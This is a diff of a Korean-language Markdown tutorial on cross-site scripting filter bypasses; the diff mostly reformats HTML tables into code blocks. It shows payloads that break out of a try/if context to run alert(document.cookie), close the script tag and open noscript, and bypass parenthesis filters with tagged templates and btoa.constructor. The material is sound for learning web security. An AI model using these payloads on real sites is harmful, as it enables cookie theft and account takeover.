@@ -144,8 +144,23 @@ document.location.href = 'abcdef?param1=**haha'-eval[alert(document['cookie'])]^
 
 1번의 경우엔 jsbeautifier, sublimetext와 같은 beautify 혹은 ide툴을 통해 문법에러를 찾아내고(괄호 에러 등), 에러가 나서 자바스크립트 구문이 정상적으로 실행되지 않는다면 크롬의 개발자도구 콘솔창에 나타나는 자바스크립트 에러메세지를 확인하여 문법 에러를 찾아 낼 수 있습니다. 예를들어보면 아래와 같습니다.
 
-
-<table border="0" cellpadding="0" cellspacing="0" class="txc-table" sans-serif;font-size:15px"="" style="border: none; border-collapse: collapse;" width="864" 고딕",="" 맑은=""><tbody><tr><td style="width: 864px; height: 24px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204);"><p> try {</p><p>    if ('injection'==&lt;%=request.getParameter("param")%&gt;) {</p><p>        var a = "<b><span style="color: rgb(9, 0, 255);">%inject here%</span></b>";</p><p>    }</p><p>    var f = function(x) {</p><p>        var z = {</p><p>            a : 1,</p><p>            b : 2,</p><p>            c : 3</p><p>        };</p><p>        return a;</p><p>    }</p><p>} catch (e) { </p><p>    console.log("err");</p><p>}</p></td></tr></tbody></table>
+```js
+ try {
+    if ('injection'==<%=request.getParameter("param")%>) {
+        var a = "%inject here%";
+    }
+    var f = function(x) {
+        var z = {
+            a : 1,
+            b : 2,
+            c : 3
+        };
+        return a;
+    }
+} catch (e) { 
+    console.log("err");
+}
+```
 
 
 위와같은 구문에서 inject here에 우리가 원하는 임의의 자바스크립트 구문을 넣을 수 있다고 해봅시다. try 구문 안에있는 if 구문 안에 var a를 선언하는 과정에서 injection이 발생하였습니다. 우리가 원하는 스크립트를 실행시키기 위해선 if 조건과 상관없이 동작하도록 자바스크립트 코드를 재구성하여야 합니다.
@@ -164,11 +179,28 @@ document.location.href = 'abcdef?param1=**haha'-eval[alert(document['cookie'])]^
 
 
 두번째 방법은 아래와 같습니다.
-
-
-<table border="0" cellpadding="0" cellspacing="0" class="txc-table" sans-serif;font-size:15px"="" style="border: none; border-collapse: collapse;" width="864" 고딕",="" 맑은=""><tbody><tr><td style="width: 864px; height: 24px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204);"><p> try {</p><p>    if ('injection'==&lt;%=request.getParameter("param")%&gt;) {</p><p>        var a = <b><span style="color: rgb(9, 0, 255);">"</span><span style="color: rgb(9, 0, 255);">blahblah";</span></b></p><p><b><span style="color: rgb(9, 0, 255);">    }</span></b></p><p><b><span style="color: rgb(9, 0, 255);">} catch(e) { }</span></b></p><p><b><span style="color: rgb(9, 0, 255);">alert(document.cookie);</span></b></p><p><b><span style="color: rgb(9, 0, 255);">&lt;/script&gt;</span></b></p><p><b><span style="color: rgb(9, 0, 255);">&lt;noscript&gt;</span></b>";</p><p>    }</p><p>    var f = function(x) {</p><p>        var z = {</p><p>            a : 1,</p><p>            b : 2,</p><p>            c : 3</p><p>        };</p><p>        return a;</p><p>    }</p><p>} catch (e) { </p><p>    console.log("err");</p><p>}</p></td></tr></tbody></table>
-
-
+```js
+ try {
+    if ('injection'==<%=request.getParameter("param")%>) {
+        var a = "blahblah";
+    }
+} catch(e) { }
+alert(document.cookie);
+</script>
+<noscript>";
+    }
+    var f = function(x) {
+        var z = {
+            a : 1,
+            b : 2,
+            c : 3
+        };
+        return a;
+    }
+} catch (e) { 
+    console.log("err");
+}
+```
 </script>와 <noscript>를 삽입할 수 있을 시 위와같은 구문으로 대충 닫는것만 맞춰주고 스크립트를 실행시킨 후 스크립트 태그를 닫아버리고 noscript를 동작시키는것입니다.
 
 
@@ -223,13 +255,13 @@ var a='**\**'; var b='**;alert(document.cookie);var z='**';
 **( ) 괄호를 필터링 할 시**
 
 
-alert`123`;
+`` alert`123`; ``
 
 
 **btoa.constructor`alert\x28document.cookie\x29```**
 
 
--> 이에대해 조금 더 설명하자면, `(back quote)는 살짝 특별한 Character이다. 문자열을 만들때도 사용할 수 있으며, 함수를 실행할 때 인자를 alert`123`; 처럼 줄 수도 있다. 때문에 이에 대해 조금더 언급하면, btoa와 같은 Native function의 constructor method를 이용하여 인자로**문자열로 된 스크립트 구문**을 전달하면 btoa의 constructor function으로 스크립트가 지정된다. 이후 `(back quote)를 두번 써줌으로써 btoa를 실행시키게 되고, 이로인해 앞에서 저장한 스크립트 구문이 실행되게 된다. 또한 자바스크립트에선 \x28과 같은 Ascii hex를 자동으로 converting 해주기 때문에 \x28, \u28, \u0028과 같은 구문들이 문자열 내에서 자동으로 ascii charcter로 변환되게 된다. 때문에 최종적으로 alert(document.cookie) 구문이 실행되게 된다.
+> 이에대해 조금 더 설명하자면, `` ` ``(back quote)는 살짝 특별한 Character이다. 문자열을 만들때도 사용할 수 있으며, 함수를 실행할 때 인자를 `` alert`123`; `` 처럼 줄 수도 있다. 때문에 이에 대해 조금더 언급하면, btoa와 같은 Native function의 constructor method를 이용하여 인자로**문자열로 된 스크립트 구문**을 전달하면 btoa의 constructor function으로 스크립트가 지정된다. 이후 `` ` ``(back quote)를 두번 써줌으로써 btoa를 실행시키게 되고, 이로인해 앞에서 저장한 스크립트 구문이 실행되게 된다. 또한 자바스크립트에선 \x28과 같은 Ascii hex를 자동으로 converting 해주기 때문에 \x28, \u28, \u0028과 같은 구문들이 문자열 내에서 자동으로 ascii charcter로 변환되게 된다. 때문에 최종적으로 alert(document.cookie) 구문이 실행되게 된다.
 
 
 ---
